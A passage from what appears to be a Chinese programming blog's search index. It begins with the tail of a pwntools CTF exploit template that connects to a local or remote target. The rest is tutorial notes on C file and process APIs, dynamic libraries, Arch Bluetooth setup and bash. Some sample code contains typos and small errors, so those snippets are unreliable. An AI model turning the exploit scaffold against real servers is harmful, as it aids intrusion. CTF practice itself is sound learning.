shell\tad(0x10)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\t\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path, &quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process(env = &#123;&quot;LD_LIBRARY_PATH&quot; : libs_path&#125; )\t\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n","categories":["ctf"],"tags":["pwn"]},{"title":"c文件操作","url":"/2020/08/28/dev/language/c/file/","content":"文件操作打开和关闭头文件\n#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;\n\n常用函数\nint open(const char *pathname, int flags);int open(const char *pathname, int flags, mode_t mode);int close(int fd);\nopen 函数有两个形式.其中 pathname 是我们要打开的文件名(包含路径名称,缺省是认为在当前路径下面).flags 可以去下面的一个值或者是几个值的组合.O_RDONLY:以只读的方式打开文件.O_WRONLY:以只写的方式打开文件.O_RDWR:以读写的方式打开文件.O_APPEND:以追加的方式打开文件.O_CREAT:创建一个文件.O_EXEC:如果使用了 O_CREAT 而且文件已经存在,就会发生一个错误.O_NOBLOCK:以非阻塞的方式打开一个文件.O_TRUNC:如果文件已经存在,则删除文件的内容.前面三个标志只能使用任意的一个.如果使用了 O_CREATE 标志,那么我们要使用 open 的第二种形式.还要指定 mode 标志,用来表示文件的访问权限.mode 可以是以下情况的组合.\nS_IRUSR 用户可以读 S_IWUSR 用户可以写\nS_IXUSR 用户可以执行 S_IRWXU 用户可以读写执行\nS_IRGRP 组可以读 S_IWGRP 组可以写\nS_IXGRP 组可以执行 S_IRWXG 组可以读写执行\nS_IROTH 其他人可以读 S_IWOTH 其他人可以写\nS_IXOTH 其他人可以执行 S_IRWXO 其他人可以读写执行\nS_ISUID 设置用户执行 ID S_ISGID 设置组的执行 ID\n我们也可以用数字来代表各个位的标志.Linux 总共用 5 个数字来表示文件的各种权限.00000.第一位表示设置用户 ID.第二位表示设置组 ID,第三位表示用户自己的权限位,第四[18 of 104]Linux 操作系统 C 语言编程入门位表示组的权限,最后一位表示其他人的权限.每个数字可以取 1(执行权限),2(写权限),4(读权限),0(什么也没有)或者是这几个值的和..比如我们要创建一个用户读写执行,组没有权限,其他人读执行的文件.设置用户 ID 位那么我们可以使用的模式是–1(设置用户 ID)0(组没有设置)7(1+2+4)0(没有权限,使用缺省)5(1+4)即 10705:open(“temp”,O_CREAT,10705);如果我们打开文件成功,open 会返回一个文件描述符.我们以后对文件的所有操作就可以对这个文件描述符进行操作了.\n拷贝文件例子#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;errno.h&gt;#define BUFFER_SIZE 4096int main(int argc, char **argv) &#123;\tint from_fd, to_fd;\t\tint bytes_read, bytes_write;\tchar buffer[BUFFER_SIZE];\tchar *ptr;\tif(argc != 3) &#123;\t\tfprintf(stderr, &quot;Usage: %s fromfile tofile\\n\\a&quot;, argv[0]);\t\texit(1);\t&#125;\t//打开源文件\tif(-1 == (from_fd = open(argv[1], O_RDONLY))) &#123;\t\tfprintf(stderr, &quot;Open %s Error: %s\\n&quot;, argv[1], strerror(errno));\t\texit(1);\t&#125;\t//创建目的文件\tif(-1 == (to_fd = open(argv[2], O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR))) &#123;\t\tfprintf(stderr, &quot;Open %s Error: %s\\n&quot;, argv[2], strerror(errno));\t\texit(1);\t&#125;\t//拷贝文件\twhile(bytes_read = read(from_fd, buffer, BUFFER_SIZE)) &#123;\t\tif((bytes_read == -1) &amp;&amp; (errno != EINTR)) break;\t\telse if(bytes_read &gt; 0) &#123;\t\t\tptr = buffer;\t\t\twhile(bytes_write = write(to_fd, ptr, bytes_read)) &#123;\t\t\t\tif((bytes_write == -1) &amp;&amp; (errno != EINTR)) break;\t\t\t\telse if(bytes_write == bytes_read) break;\t\t\t\telse if(bytes_write &gt; 0) &#123;\t\t\t\t\tptr += bytes_write;\t\t\t\t\tbytes_read -= bytes_write;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\tclose(from_fd);\tclose(to_fd);\treturn 0;&#125;\n\n获取文件信息文件具有各种各样的属性,除了我们上面所知道的文件权限以外,文件还有创建时间,大小等等属性.有时侯我们要判断文件是否可以进行某种操作(读,写等等).这个时候我们可以使用 access 函数.\n#include &lt;unistd.h&gt;;int access(const char *pathname,int mode);\n\npathname:是文件名称,mode 是我们要判断的属性.可以取以下值或者是他们的组合.R_OK 文件可以读,W_OK 文件可以写,X_OK 文件可以执行,F_OK 文件存在.当我们测试成功时,函数返回 0,否则如果有一个条件不符时,返回-1.如果我们要获得文件的其他属性,我们可以使用函数 stat 或者 fstat.\n头文件\n#include &lt;sys/stat.h&gt;;#include &lt;unistd.h&gt;;\n\n常用函数\nint stat(const char *file_name,struct stat *buf);int fstat(int filedes,struct stat *buf);\n\n信息结构体\nstruct stat &#123;\tdev_t st_dev; // 设备\tino_t st_ino; // 节点\tmode_t st_mode; // 模式\tnlink_t st_nlink; // 硬连接\tuid_t st_uid; // 用户 ID\tgid_t st_gid; // 组 ID \tdev_t st_rdev; //设备类型\toff_t st_off; // 文件字节数\tunsigned long st_blksize; // 块大小\tunsigned long st_blocks; // 块数\ttime_t st_atime; // 最后一次访问时间 \ttime_t st_mtime; // 最后一次修改时间\ttime_t st_ctime; //最后一次改变时间(指属性)&#125;;\n\nstat 用来判断没有打开的文件,而 fstat 用来判断打开的文件.我们使用最多的属性是 st_mode.通过着属性我们可以判断给定的文件是一个普通文件还是一个目录,连接等等.可以使用下面几个宏来判断.S_ISLNK(st_mode):是否是一个连接.S_ISREG 是否是一个常规文件.S_ISDIR 是否是一个目录 S_ISCHR 是否是一个字符设备.S_ISBLK 是否是一个块设备 S_ISFIFO 是否 是一个 FIFO文件.S_ISSOCK 是否是一个 SOCKET 文件\nMisc#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;dirent.h&gt;#include &lt;string.h&gt;void sys_01() //复制文件函数&#123;       \t//打开已经存在的文件\tint fd = open(&quot;Logan.txt&quot;,O_RDONLY);\tif(fd == -1)\t&#123;\t\tperror(&quot;open&quot;);\t\texit(1);\t&#125;\t//创建文件\tint fd2 = open(&quot;Newfile&quot;,O_CREAT | O_WRONLY | O_EXCL, 0755);\tif(fd2 == -1)\t&#123;\t\tperror(&quot;open2&quot;);\t\texit(1);\t&#125;\tchar buf[2048] = &#123;0&#125;;\tint count = read(fd,buf,sizeof(buf));\tif(count == -1)\t&#123;\t\tperror(&quot;read&quot;);\t\texit(1);\t&#125;\twhile(count)\t&#123;\t\t//将读出的文件写到另一个文件中\t\tint sizeofwrite = write(fd2,buf,count);\t\tprintf(&quot;write bytes %d\\n&quot;,sizeofwrite);\t\tcount = read(fd,buf,sizeof(buf));\t&#125;\tclose(fd);\tclose(fd2);&#125;void sys_02()//使用lseek 实现空洞文件&#123;\tint fd = open(&quot;Logan.txt&quot;,O_RDWR);\tif(fd == -1)\t&#123;\t\tperror(&quot;open file&quot;);\t\texit(1);\t&#125;\tint sizeoffile = lseek(fd,0,SEEK_END);\tprintf(&quot;Size fo file %d\\n&quot;,sizeoffile);\tlseek(fd,1000,SEEK_END);\tprintf(&quot;Size fo file %d\\n&quot;,sizeoffile);\twrite(fd,&quot;A&quot;,1);\tclose(fd);&#125;//stat//lstat//access//chmod//chown//truncate//link//symlink//readlink//unlink//rename//fcntl//dup,dup2//dentry,inode//解决gcc编译过程中的c99语法报错问题//alias gcc = &#x27;gcc -std=gnu99&#x27;void sys_03() //stat&#123;\t//穿透函数---(在获取软链接文件大小等内容时,链接到目标文件获取大小)\t//int stat(const char *path,struct stat *buf)\t//int fstat(int fd, struct stat *buf);\t//不穿透函数---(在获取软链接文件大小等内容时,直接就是本文件大小)\t//int lstat(const char *path, struct stat *buf)\t/*\t * struct stat &#123;\t * dev_t st_dev; \t//文件设备编号\t * ino_t st_ino; \t//节点\t * mode_t st_mode;\t//文件的类型和存储权限\t * nlink_t st_nlink;\t//链接到该文件的数目\t * uid_t st_uid;\t//用户ID\t * gid_t st_gid;\t//组ID\t * dev_t st_rdev;\t//(设备类型) 若此文件为设备文件,则其为设备编号\t * off_t st_size;\t//文件字节数(文件大小)\t * blksize_t st_blksize;//块大小(文件系统的I/O缓冲区大小\t * blkcnt_t st_blocks;  //块数\t * time_t st_atime;     //最后一次访问时间\t * time_t st_mtime;     //最后一次修改时间\t * time_t st_ctime      //最后一次改变时间\t * &#125;;\t * */\tstruct stat st;\tint fd = -1;\tfd = open(&quot;Logan.txt&quot;,O_RDWR);\tif(fd == -1)\t&#123;\t\tperror(&quot;open file&quot;);\t\texit(1);\t&#125;\tfstat(fd,&amp;st);\t\t//获取文件大小\tprintf(&quot;Size of file %d\\n&quot;,st.st_size);&#125;void sys_04() //access()&#123;\t//int access(const char *pathname,int mode);\t//测试指定文件是否拥有某种权限\t\tint ret = access(&quot;Logan.txt&quot;,W_OK);\tif(ret == -1)\t&#123;\t\tperror(&quot;access&quot;);\t\texit(1);\t&#125;\tprintf(&quot;you can write this file.\\n&quot;);&#125;//实现一个chmod 命令void sys_05(int argc,char **argv) //chmod()&#123;\t//strtol(const char *nptr,char **endptr, int base); //**endptr 通常为NULL\tint ret = chmod(argv[2],strtol(argv[1],NULL,8)); //八进制\tif(argc &lt; 3)\t&#123;\t\tprintf(&quot;Useage: ./a.out 755 filename&quot;);\t&#125;\tif(ret == -1)\t&#123;\t\tperror(&quot;Chmod&quot;);\t\texit(1);\t&#125;\tprintf(&quot;Mode changed!\\n&quot;);\t//strtol&#125;void sys_06(int argc,char **argv) //chown()&#123;\t /*\t  * int chown(const char *pathname, uid_t owner,gid_t group);\t  * int fchown(int fd,uid_t owner,gid_t group);\t  * int lchown(const char *pathname,uid_t owner,gid_t group);\t  * uid_t &amp;&amp; gid_t 可通过 etc/passwd 获取\t  * 查看配置文件  man 5 passwd\t  * */&#125;void sys_07() //truncate()&#123;\t/*\t * int truncate(const char *path, off_t length);\t * int ftruncate(int fd, off_t length);\t * */\tint trun = truncate(&quot;Logan.txt&quot;,12);\tif(trun == -1)\t&#123;\t\tperror(&quot;truncate&quot;);\t\texit(1);\t&#125;\tprintf(&quot;OK!&quot;);&#125;void sys_08()&#123;\t/*创建一个硬链接\t *int link(const char *oldpath,const char *newpath);\t *创建软链接\t *syslink()\t *读软链接对应的文件名,不是内容\t *readlink()\t *\t *删除一个文件的目录项并减少它的链件数,若成功则返回0,否则返回1\t *如果想通过这个函数来成功删除文件,你就必须拥有这个目录的可执行和写权限\t *unlink()\t * */&#125;void sys_09()//rename() 更改名字函数&#123;\t//rename()\t//renameat(int olddirfd,const char *oldpath,int newdirfd,const char *newpath);\t\t//renameat2(int olddirfd ,const char *oldpath, int newdirfd, const char *newpath, unsigned int flags);\tint ret = rename(&quot;./Logan.txt&quot;,&quot;OK.txt&quot;);\tif (ret == -1)\t&#123;\t\tperror(&quot;rename&quot;);\t\texit(1);\t&#125;\tprintf(&quot;OK!&quot;);&#125;void sys_10(int argc,char **argv) //目录操作函数&#123;\t//chdir()   改变目录 -- int chdir(const char *path);\t//getcwd()  获取路径\t//mkdir()   创建目录\t//rmdir()   删除空目录\t//opendir   打开一个目录 打开成功非0 失败返回 NULL\t//\t//readdir   读目录\t//struct dirent *readdir(DIR *dirp);\t//\t//返回值:\t//struct dirent\t//&#123;\t//\tino_t dino;    //此目录进入点的inode\t//\tff_t  d_off;   //目录文件开头至此目录进入点的位移\t//\tsigned short int d_reclen; //d_name的长度,不包含NULL字符\t//\tunsigned char d_type;\t//d_name所指的文件类型\t//\thar d_name[256];\t//文件名\t//&#125;\t//d_type\t//DT_BLK -块设备\t//DT_CHR -字符设备\t//DT_DIR -目录\t//DT_LNK -软链接\t//DT_FIFO -管道\t//DT_REG  -普通文件\t//DT_SOCK - 套接字\t//DT_UNKNOWN -未知\t//\t//-D_BSD_SOURCE 编译时添加的宏定义\t//\t//\t//closedir  关闭目录\t//\tchar path[256] = &#123;0&#125;;\tif(argc &lt; 2)\t&#123;\t\tprintf(&quot;Useage: ./a.out path&quot;);\t\texit(1);\t&#125;\tint ret = chdir(argv[1]);\tif(ret == -1)\t&#123;\t\tperror(&quot;chdir&quot;);\t\texit(1);\t&#125;\tgetcwd(path, sizeof(path));\tprintf(&quot;current path: %s\\n&quot;,path);&#125;//使用readdir函数来获取当前普通文件个数实例int getFileNum(char *root)&#123;\tDIR* dir = NULL;\tdir = opendir(root);\tif(dir == NULL)\t&#123;\t\tperror(&quot;opendir&quot;);\t\texit(1);\t&#125;\t//便利目录\tstruct dirent* ptr = NULL;\tchar path_name[1024] = &#123;0&#125;;\tint total = 0;\twhile( (ptr = readdir(dir)) )\t&#123;\t\t//过滤. 和 ..\t\tif(strcmp(ptr-&gt;d_name,&quot;.&quot;) == 0 || strcmp(ptr-&gt;d_name,&quot;..&quot;) == 0)\t\t&#123;\t\t\tcontinue;\t\t&#125;\t\t\t//如果是目录\t\tif(ptr-&gt;d_type == DT_DIR)\t\t&#123;\t\t\t//递归 读目录\t\t\tsprintf(path_name,&quot;%s/%s&quot;,root,ptr-&gt;d_name);\t\t\ttotal += getFileNum(path_name);\t\t&#125;\t\t\t//如果是普通文件\t\tif(ptr-&gt;d_type == DT_REG)\t\t&#123;\t\t\ttotal++;\t\t&#125;\t&#125;\tclosedir(dir);\treturn total;&#125;void sys_11(int argc,char **argv)&#123;\tif(argc &lt; 2)\t&#123;\t\tprintf(&quot;Usage:./a.out filepath\\n&quot;);\t\texit(1);\t&#125;\tprintf(&quot;Number of Curent file:%d\\n&quot;,getFileNum(argv[1]));&#125;void sys_12()&#123;\t/*文件描述符的复制\t *\t *dup(),dup2()\t *dup()返回一个最小的未被占用的文件描述符号\t *dup2() dup2(int odfd,int newfd);\t *打开文件描述符前,若newfd已经存在先关闭newfd,然后再拷贝\t *若oldfd与newfd是同一个文件描述符,则不会关闭newfd\t *\t * */\tint fd = open(&quot;Logan.txt&quot;,O_RDWR);\tif(fd == -1)\t&#123;\t\tperror(&quot;open&quot;);\t\texit(1);\t&#125;\tprintf(&quot;file open fd = %d\\n&quot;,fd);\t\t//找到进程文件描述表中 第一个 可用的文件描述符\t//将参数指定的文件复制到该描述符后,返回这个描述符\tint ret = dup(fd);\tif(ret == -1)\t&#123;\t\tperror(&quot;dup&quot;);\t\texit(1);\t&#125;\tprintf(&quot;dup fd = %d\\n&quot;,ret);\tchar* buf = &quot;你是猴子派来的救兵吗?\\n&quot;;\tchar *buf_2 = &quot;你大爷的! 我是程序猿!!\\n&quot;;\twrite(fd, buf,strlen(buf));\twrite(ret, buf_2,strlen(buf_2));\tclose(fd);\tclose(ret);&#125;void sys_13()&#123;\t//fcntl\t//\t//int fcntl(int fd, int cmd)\t//int fcntl(int fd, int cmd, long arg)  (目前使用)\t//int fcntl(int fd, int cmd, struct flock *lock)\t//\t//复制现有的文件描述符 F_DUPFD\t//获得/设置文件描述符标记 --cmd F_GETFD / F_SETFD\t//\t//获得/设置文件状态标记   --CMD \t//  ***F——GETFL\t//只读打开:  O_RDONLY\t//只写打开:  O_WRONLY\t//读写打开:  O_RDWR\t//执行打开:  O_EXEC\t//搜索打开目录:  O_SEARCH\t//追加写:    A_PPEND\t//非阻塞模式: O_NONBLOCK\t//  ***F_SETFL\t//O_APPEND\t//O_NONBLOCK\t//\t//获得/设置异步I/O所有权 --cmd  F_GETOWN / F_SETOWN\t//获得/设置记录锁 --cmd F_GETLK / F_SETLK / F_SETLKW\t\tchar *txt1 = &quot;我是&quot;\tchar *txt2 = &quot;Logan&quot;\tint fd = open(&quot;Logan.txt&quot;,O_WRONLY);\tif(fd == -1)\t\t&#123;\t\tperror(&quot;open&quot;);\t\texit(1);\t&#125;\tif(write(fd,txt1,strlen(txt1)) == -1)\t&#123;\t\tperror(&quot;write&quot;);\t\teixt(1);\t&#125;\tint flag = fcntl(fd, F_GETFL, 0);&#125;int main(int argc,char **argv)&#123;\t//sys_01();\t//sys_02();\t//sys_03();\t//sys_04();\t//sys_05(argc,argv);\t//sys_07();\t//sys_09();\t//sys_10(argc,argv);\t//sys_11(argc,argv);\tsys_12();\treturn 0;&#125;\n\n\n\n实现 ls#include &lt;sys/types.h&gt; #include &lt;sys/stat.h&gt; #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; #include &lt;time.h&gt; #include &lt;pwd.h&gt; #include &lt;grp.h&gt; #include &lt;string.h&gt;int main(int argc,char *argv[])&#123;\tif(argc &lt; 2)\t&#123;\t\tprintf(&quot;Useage: ./a.out filename\\n&quot;);\t\texit(1);\t&#125;\tstruct stat st;\tint ret = stat(argv[1],&amp;st);\tif(ret == -1)\t&#123;\t\tperror(&quot;stat&quot;);\t\texit(1);\t&#125;\t//储存文件类型和访问权限\tchar perms[11] = &#123;0&#125;;\t//判断文件类型\tswitch(st.st_mode &amp; S_IFMT)\t&#123;\t\tcase S_IFLNK:\t\t\tperms[0] = &#x27;1&#x27;;\t\t\tbreak;\t\tcase S_IFDIR:\t\t\tperms[0] = &#x27;d&#x27;;\t\t\tbreak;\t\tcase S_IFREG:\t\t\tperms[0] = &#x27;-&#x27;;\t\t\tbreak;\t\tcase S_IFBLK:\t\t\tperms[0] = &#x27;b&#x27;;\t\t\tbreak;\t\tcase S_IFCHR:\t\t\tperms[0] = &#x27;c&#x27;;\t\t\tbreak;\t\tcase S_IFSOCK:\t\t\tperms[0] = &#x27;s&#x27;;\t\t\tbreak;\t\tcase S_IFIFO:\t\t\tperms[0] = &#x27;P&#x27;;\t\t\tbreak;\t\tdefault:\t\t\tperms[0] = &#x27;?&#x27;;\t\t\tbreak;\t\t\t&#125;\t//判断文件的访问权限\t//文件所有者\tperms[1] = (st.st_mode &amp; S_IRUSR) ? &#x27;r&#x27; : &#x27;-&#x27;;\tperms[2] = (st.st_mode &amp; S_IWUSR) ? &#x27;w&#x27; : &#x27;-&#x27;;\tperms[3] = (st.st_mode &amp; S_IXUSR) ? &#x27;x&#x27; : &#x27;-&#x27;;\t//文件所属组\tperms[4] = (st.st_mode &amp; S_IRGRP) ? &#x27;r&#x27; : &#x27;-&#x27;;\tperms[5] = (st.st_mode &amp; S_IWGRP) ? &#x27;w&#x27; : &#x27;-&#x27;;\tperms[6] = (st.st_mode &amp; S_IXGRP) ? &#x27;x&#x27; : &#x27;-&#x27;;\t//其他人\tperms[7] = (st.st_mode &amp; S_IROTH) ? &#x27;r&#x27; : &#x27;-&#x27;;\tperms[8] = (st.st_mode &amp; S_IWOTH) ? &#x27;w&#x27; : &#x27;-&#x27;;\tperms[9] = (st.st_mode &amp; S_IXOTH) ? &#x27;x&#x27; : &#x27;-&#x27;;\t//硬件链接计数\tint linkNum = st.st_nlink;\t//文件所有者\tchar* fileUser = getpwuid(st.st_uid)-&gt;pw_name;\t//文件所属组\tchar* fileGrp = getgrgid(st.st_gid)-&gt;gr_name;\t//文件大小\tint fileSize = (int)st.st_size;\t//修改时间\tchar* time = ctime(&amp;st.st_mtime);\tchar mtime[512] = &#123;0&#125;;\tstrncpy(mtime, time, strlen(time)-1);\t\tchar buf[1024];\tsprintf(buf,&quot;%s %d %s %s %d %s %s&quot;,perms,linkNum,fileUser,fileGrp,fileSize,mtime,argv[1]);\tprintf(&quot;%s\\n&quot;,buf);\treturn 0;&#125;\n\n","categories":["language"],"tags":["c"]},{"title":"c进程","url":"/2020/08/28/dev/language/c/process/","content":"获取进程信息#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;pwd.h&gt;int main(void) &#123;/*\t#include &lt;unistd.h&gt;\tpid_t getpid(void);  //获取当前pid\tpid_t getppid(void); //获取父进程pid*/\tprintf(&quot;用户pid: %d\\n&quot;, getpid());\t\tprintf(&quot;父子进程pid: %d\\n&quot;, getppid());\t/*\t#include &lt;unistd.h&gt;\t#include &lt;sys/types.h&gt;\tuid_t getuid(void); //获取当前用户uid\tuid_t geteuid(void);//获取当前进程有效uid\tgid_t getgid(void); //获取当前用户的gid\tgid_t getegid(void);//获取当前进程有效gid*/\tprintf(&quot;用户uid: %d\\n&quot;, getuid());\t\tprintf(&quot;进程有效uid: %d\\n&quot;, geteuid());\t //euid(Effective user id)\tprintf(&quot;用户gid: %d\\n&quot;, getgid());\t\tprintf(&quot;进程有效gid: %d\\n&quot;, getegid());\t/*\t#include &lt;pwd.h&gt;\t\t#include &lt;sys/types.h&gt;\t#include &lt;unistd.h&gt;\tstruct passwd *info &#123;\t\tchar *pw_name; //登录名称\t\tchar *pw_passwd; //登录口令\t\tuid_t pw_uid; //用户id\t\tgid_t pw_gid; //用户组id\t\tchar *pw_gecos; //用户真名\t\tchar *pw_dir; //用户目录\t\tchar *pw_shell; //用户shell\t&#125;;\tstruct passwd *getpwuid(uid_t uid);*/\t\tstruct passwd *info = NULL;\tinfo = getpwuid(getuid());\tprintf(&quot;%p\\n&quot;, getpwuid(getuid()));\tif(info != NULL) &#123;\t\tprintf(&quot;Name  : %s\\n&quot;, info-&gt;pw_name);\t\tprintf(&quot;Passwd: %s\\n&quot;, info-&gt;pw_passwd);\t\tprintf(&quot;Uid   : %d\\n&quot;, info-&gt;pw_uid);\t\tprintf(&quot;Gid   : %d\\n&quot;, info-&gt;pw_gid);\t\tprintf(&quot;Real Name: %s\\n&quot;, info-&gt;pw_gecos);\t\tprintf(&quot;Home dir : %s\\n&quot;, info-&gt;pw_dir);\t\tprintf(&quot;Shell    : %s\\n&quot;, info-&gt;pw_shell);\t&#125;\treturn 0;&#125;\n\n创建子进程头文件\n#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;\n\n函数\npid_t wait(int *stat_loc);pid_t waitpid(pid_t pid, int *stat_loc, int options);\n\nwait 系统调用会使父进程阻塞直到一个子进程结束或者是父进程接受到了一个信号.如果没有父进程没有子进程或者他的子进程已经结束了 wait 回立即返回.成功时(因一个子进程结束)wait 将返回子进程的 ID,否则返回-1,并设置全局变量 errno.stat_loc 是子进程的退出状态.子进程调用 exit,_exit 或者是 return 来设置这个值. 为了得到这个值 Linux 定义了几个宏来测试这个返回值.WIFEXITED:判断子进程退出值是非 0WEXITSTATUS:判断子进程的退出值(当子进程退出时非 0).WIFSIGNALED:子进程由于有没有获得的信号而退出.WTERMSIG:子进程没有获得的信号号(在 WIFSIGNALED 为真时才有意义).waitpid 等待指定的子进程直到子进程返回.如果 pid 为正值则等待指定的进程(pid).如果为 0 则等待任何一个组 ID 和调用者的组 ID 相同的进程.为-1 时等同于 wait 调用.小于-1 时等待任何一个组 ID 等于 pid 绝对值的进程. stat_loc 和 wait 的意义一样. options 可以决定父 进 程 的 状 态 . 可 以 取 两 个 值 WNOHANG : 父 进 程 立 即 返 回 当 没 有 子 进 程 存 在 时 .WUNTACHED:当子进程结束时 waitpid 返回,但是子进程的退出状态不可得到.\n#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;errno.h&gt;#include &lt;stdio.h&gt;#include &lt;math.h&gt;#include &lt;stdlib.h&gt;int main(int argv, char **argc) &#123;\tpid_t pid;\tint status;\tprintf(&quot;This will demostrate how to get child status\\n&quot;);\tif(-1 == (pid = fork())) &#123;\t\tprintf(&quot;Fork error: %s\\n&quot;, strerror(errno)); //与perror差不多\t\texit(-1);\t&#125;else if(pid == 0) &#123; //代表是子进程\t\tint i;\t\tprintf(&quot;I&#x27;m the child : %d\\n&quot;, getpid());\t\tfor(int i = 0; i &lt; 1000000; ++i) &#123; //进行大量计算\t\t\tsin(i);\t\t&#125;\t\tsleep(50);\t\ti = 4;\t\tprintf(&quot;I exit with %d\\n&quot;, i);\t\texit(i); //以 错误号为4退出\t&#125;\t/*\t\t*/\twhile((-1 == (pid = wait(&amp;status))) &amp; (errno == EINTR)); //父进程阻塞,直到子进程结束\tif(-1 == pid) &#123;\t\tprintf(&quot;Wait error: %s\\n&quot;, strerror(errno));\t&#125;else if(!status) &#123;\t\tprintf(&quot;Child %d terminated normally return status is zero\\n&quot;);\t&#125;else if(WIFEXITED(status)) &#123;\t\tprintf(&quot;Child %d terminated normally return status is %d\\n&quot;,\t\tpid, WEXITSTATUS(status));\t&#125;else if(WIFSIGNALED(status)) &#123; //子进程是以信号方式退出\t\tprintf(&quot;Child %d terminated due to signal %d\\n&quot;,\t\tpid, WTERMSIG(status));\t&#125; \treturn 0;&#125;\n\n实现demon进程检查邮箱程序，让子进程在后台运行。\n#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;stdlib.h&gt;//linux 默认个人邮箱地址是: /var/spool/mail用户登录名称#define MAIL &quot;/var/spool/mail/logan/a.com&quot;#define SLEEP_TIME 2int main(void) &#123;\tpid_t pid;\tif(-1 == (pid = fork())) &#123;\t\tprintf(&quot;Fork error: %s\\n&quot;, strerror(errno));\t\texit(1);\t&#125;else if(pid &gt; 0)\twhile(1);\tif(kill(getppid(), SIGTERM) == -1)&#123; //杀掉父进程\t\tprintf(&quot;Kill parent error: %s\\n&quot;, strerror(errno));\t\texit(1);\t&#125;\tint mailfd;\twhile(1) &#123;\tif(-1 != (mailfd = open(MAIL, O_RDONLY))) &#123;\t\tfprintf(stderr,&quot;%s&quot;, &quot;\\007&quot;);\t\tclose(mailfd);\t&#125;\tsleep(SLEEP_TIME);\t&#125;\treturn 0;&#125;\n\n\n\n文件操作\n\n","categories":["language"],"tags":["c"]},{"title":"Arch Install Buletooth","url":"/2020/08/28/env/linux/myarch/bluetooth/","content":"Arch Install Buletoothpacman -S bluez bluez-utils bluedevilsystemctl enable bluetooth\n\n其中bluedevil为图形化管理工具。\n重启后可在托盘看到图标。\n如果要用蓝牙耳机，或者蓝牙音响，还需要安装pulseaudio-bluetooth\npacman -S pulseaudio-bluetooth \n\n这个程序默认开机启动。但经常发生开机后能连接音响，却不是用音响输出声音的情况。\n执行\n$ pulseaudio -k$ pulseaudio --start\n\n再打开音频或者视频就能从蓝牙音响输出了。\n后面这两个位置是参考别人的，不懂什么原因。\n（可能有用，可能没用，最好添加下）\n\nGeneral下添加一句：\n\nEnable=Source,Sink,Media,Socket\n\n\nvim /etc/pulse.default.pa下添加（可能有用，可能没用，最好添加下）\n\nload-module module-bluetooth-discovermodule-bluetooth-policymodule-bluez5-devicemodule-bluez5-discover\n\n","categories":["env"],"tags":["linux"]},{"title":"C静态库、动态库","url":"/2020/07/23/dev/language/c/library/","content":"C library静态库动态库隐式调用显示调用实现.so文件的动态加载与自定义init函数和fini函数\nfiles\n.├── lib│   └── lib.c├── main.c├── makefile\n\nlib&#x2F;libc.c\n#include &lt;stdio.h&gt;void run() &#123;\tprintf(&quot;load ok!\\n&quot;);&#125;\n\nmain.c\n#include &lt;unistd.h&gt;#include &lt;dlfcn.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;void my_init(void) __attribute__((constructor));// 告诉gcc把这个函数扔到init_sectionvoid my_fini(void) __attribute__((destructor)); // 告诉gcc把这个函数扔到fini_sectionvoid my_init(void) &#123;\tprintf(&quot;init ...\\n&quot;);&#125;void my_fini(void) &#123;\tprintf(&quot;fini ...\\n&quot;);&#125;int main(void) &#123;\tvoid *dl;\tvoid *fun_run;\tvoid (*run)();\t//(void (*)())fun_run;\tdl = dlopen(&quot;lib/lib.so&quot;, RTLD_LAZY);\tif(dl == NULL) &#123;\t\tprintf(&quot;open fail!\\n&quot;);\t\texit(-1);\t&#125;\trun = (void (*)()) dlsym(dl, &quot;run&quot;);\trun();\tdlclose(dl);\treturn 0;&#125;\n\n\n\nmakefile\nTARGET := p1TARGET_LIB := lib.soTOTAL :=$(TARGET) : main.c $(TARGET_LIB)\tgcc main.c -o $(TARGET)\t-fPIC -rdynamic -ldl\t$(TARGET_LIB) : lib/lib.c\tgcc lib/lib.c -o lib/$(TARGET_LIB) -shared -fPIC -rdynamic\n\n输入make进行编译\n运行如下：\n./p1init ...load ok!fini ...\n\n","categories":["language"],"tags":["c"]},{"title":"Bash","url":"/2020/07/18/dev/language/bash/bash/","content":"简单的输入输出#! /bin/bash# 简单的输入输出#数组name[0]=Loganname[1]=Mikeecho &quot;Hello `whoami` !&quot;echo &quot;Your name is $&#123;name[0]&#125;, and your friend is $&#123;name[1]&#125;&quot;#inputread -p &quot;What do you like?&quot; likeecho &quot;Yeah I see, you like $&#123;like&#125;&quot;\n\nname\n#!/bin/bashread -t 30 -p &quot;Plese input your name:&quot; nameecho &quot;Your name is:&quot;$nameread -t 30 -s -p &quot;Plese input your age&quot; ageecho -e &quot;\\nYour age is $age&quot;read -n 1 -t 30 -p &quot;Please select your sex[m/f]&quot; genderecho -e &quot;\\n&quot;echo &quot;Sex is $gender&quot;\n\n运算#!/bin/bashecho &quot;Please you input two number!&quot;num1=$1num2=$2num3=$*num4=$@num5=$#total=$(($num1+$num2))echo -e &quot;\\e[1;37m OK: \\e[0m&quot;echo $totalecho $num3echo $num4echo $num5\n\n\n\nbash内置变量(通识符)#! /bin/bash# set 命令为位置参数赋值或重新赋值[1~9]set a b c d e fecho $1 $2 $3 $4 $5 